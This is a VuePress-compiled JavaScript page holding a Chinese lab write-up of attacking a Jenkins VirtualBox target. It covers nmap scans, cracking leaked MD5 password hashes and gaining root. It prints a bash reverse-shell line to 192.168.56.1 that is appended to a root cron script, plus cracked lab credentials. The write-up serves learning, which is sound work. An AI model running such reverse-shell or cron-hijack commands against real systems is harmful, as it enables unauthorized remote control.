import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as n,o as l}from"./app-ujS2oQTZ.js";const h={};function t(e,s){return l(),a("div",null,s[0]||(s[0]=[n(`<h2 id="前言" tabindex="-1"><a class="header-anchor" href="#前言"><span>前言</span></a></h2><p>可恶的virtualbox靶场，让我踩了一堆坑</p><ol><li>virtualbox必须关闭Hyper-V，让我直接没办法用wsl-kali,因此还去特意下了一个kali，最开始想试一下hyper-V版本，但是根本没法运行bat，果断放弃换用VMware，少折腾，放心。</li><li>virtualbox的NAT不会产生虚拟网卡，而是在主机创建一个virtualbox路由，让我没办法直连虚拟机，后来换用仅主机模式才直连上</li></ol><h2 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集"><span>信息收集</span></a></h2><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">┌──(kali㉿kali</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">└─$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --min-rate</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 10000</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 192.168.56.102</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -oA</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmapscan/ports</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[sudo] password </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> kali: </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Starting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 7.95</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ( </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">https://nmap.org</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ) at 2025-07-13 13:34 EDT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Nmap</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> scan</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> report</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> for</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 192.168.56.102</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> up</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (0.025s </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">latency</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> shown:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 65530</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> filtered</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ports</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (no-response)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">PORT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">     STATE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SERVICE</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">22/tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">   open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  ssh</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">25/tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">   open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  smtp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">110/tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  pop3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">3306/tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  mysql</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">8080/tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  http-proxy</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Nmap</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> done:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> IP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> address</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (1 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> up</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) scanned in 18.85 seconds</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="详细信息扫描" tabindex="-1"><a class="header-anchor" href="#详细信息扫描"><span>详细信息扫描</span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">──(kali㉿kali</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">└─$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sV</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -O</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p22,25,110,3306,8080</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">  192.168.56.102</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -oA</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmapscan/detail</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[sudo] password </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> kali: </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Starting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 7.95</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ( </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">https://nmap.org</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ) at 2025-07-13 13:57 EDT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Nmap</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> scan</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> report</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> for</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 192.168.56.102</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> up</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (0.00058s </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">latency</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">PORT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">     STATE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SERVICE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    VERSION</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">22/tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">   open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  ssh</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        OpenSSH</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 7.4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (protocol </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">| </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ssh-hostkey:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|   </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2048</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (RSA)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|   </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">256</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (ECDSA)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">_</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">  256</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (ED25519)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">25/tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">   open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  tcpwrapped</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">_smtp-commands:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Couldn&#39;t establish connection on port 25</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">110/tcp  open  tcpwrapped</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">3306/tcp open  mysql      MariaDB 10.3.23 or earlier (unauthorized)</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">8080/tcp open  http       Jetty 9.4.z-SNAPSHOT</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">|_http-title: Site doesn&#39;t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> have</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> title</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (text/html;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">charset</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">utf-8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">| </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">http-robots.txt:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> disallowed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> entry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">_/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">_http-server-header:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Jetty</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">9.4.z-SNAPSHOT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Warning:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> OSScan</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> results</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> may</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> be</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> unreliable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> because</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> we</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> could</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> at</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> least</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> closed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> port</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Device</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> type:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> WAP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">general</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> purpose</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Running:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Actiontec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> embedded,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Linux</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 2.4.X</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">OS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> CPE:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cpe:/h:actiontec:mi424wr-gen3i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cpe:/o:linux:linux_kernel</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cpe:/o:linux:linux_kernel:2.4.37</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">OS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> details:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Actiontec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> MI424WR-GEN3I</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> WAP,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> DD-WRT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> v24-sp2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (Linux </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2.4.37</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">OS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Service</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> detection</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> performed.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Please</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> report</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> any</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> incorrect</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> results</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> at</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> https://nmap.org/submit/</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> .</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Nmap</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> done:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> IP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> address</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (1 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> up</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) scanned in 28.64 seconds</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="渗透过程" tabindex="-1"><a class="header-anchor" href="#渗透过程"><span>渗透过程</span></a></h2><p>搜索框架Jenkins发现超多漏洞利用，随便用一个看看</p><p><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250714023553.png" alt="image.png" loading="lazy"><br> 只有一个文件读取可以用，可惜只能读取一行内容，没什么帮助</p><p>目光回到web，进入默认web页（80）这个端口似乎没扫描出来<br> 爆破一下，发现<br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250715082826.png" alt="image.png" loading="lazy"></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">tiago:5978a63b4654c73c60fa24f836386d87</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">trindade:f463f63616cb3f1e81ce46b39f882fd5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">eder:9b38e2b1e8b12f426b0d208a7ab6cb98</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>用identifier识别一下哈希类型<br> [[w1r3s#<strong>小技巧</strong>--hash类型识别|hash识别]]<br> 均为MD5<br> 用在线工具解密</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">tiago:italia99</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">trindade:marianna</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">eder:vipsu</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>尝试在80端口登录<br> 登陆成功，然后进行项目构建，在构建过程中执行反弹shell命令<br> tips：这里因为仅主机连接，所以又开了frp隧道，才连接上kali攻击机</p><p>经过一系列提权尝试，都没有成功，以下是可行方案</p><h3 id="crontab定时任务提权" tabindex="-1"><a class="header-anchor" href="#crontab定时任务提权"><span>Crontab定时任务提权</span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/crontab</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">SHELL</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/sbin:/bin:/usr/sbin:/usr/bin</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">MAILTO</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">root</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># For details see man 4 crontabs</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Example of job definition:</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># .---------------- minute (0 - 59)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># |  .------------- hour (0 - 23)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># |  |  .---------- day of month (1 - 31)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># |  |  |  |  |</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># *  *  *  *  * user-name  command to be executed</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>每五分钟执行一次<code>/etc/script/CleaningScript.sh</code>命令，查看一下</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/script/CleaningScript.sh</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#!/bin/bash</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /var/log/httpd/access_log.txt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>追加一条</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/8883 0&gt;&amp;1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt;&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/etc/script/CleaningScript.sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>攻击机监听8883获得root权限shell</p><h2 id="总结" tabindex="-1"><a class="header-anchor" href="#总结"><span>总结</span></a></h2><ol><li>走了点弯路，学会了内网攻击机，与其他网段内网机器的通讯的方法，就是frp隧道</li><li>msfconsole不是万能的</li><li>内网理论更新--定时任务</li></ol>`,25)]))}const 